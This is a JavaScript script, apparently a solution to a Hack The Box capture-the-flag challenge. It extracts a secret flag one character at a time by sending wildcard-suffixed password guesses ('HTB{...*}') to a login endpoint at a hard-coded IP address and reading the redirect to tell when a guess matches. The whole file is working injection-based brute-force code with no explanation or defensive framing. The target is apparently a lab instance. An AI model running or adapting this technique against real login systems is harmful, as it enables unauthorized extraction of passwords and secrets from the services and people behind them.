findFlag = async () => {
    let atoz = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
    localStorage.setItem("flag", '');
    let isSearch = true;
    while(isSearch){
        isSearch = false;
        for(i=0;i<atoz.length;i++){
            console.log(localStorage.getItem("flag")+atoz[i]);
            let rq = await fetch('http://206.189.121.131:31042/login', {
                method: 'POST',
                body: new URLSearchParams({
                    'username': 'reese',
                    'password': 'HTB{'+localStorage.getItem("flag")+atoz[i]+'*}'
                })
            });
            if(rq.url === 'http://206.189.121.131:31042/'){
                updatedPass = localStorage.getItem("flag")+atoz[i];
                localStorage.setItem("flag", updatedPass);
                console.clear();
                console.log(localStorage.getItem("flag"));
                isSearch = true;
            }
        }
    }
    console.clear();
    console.log('Flag is');
    console.log('%c'+localStorage.getItem("flag"),"color: green ;font-weight: bold;");
}
findFlag();
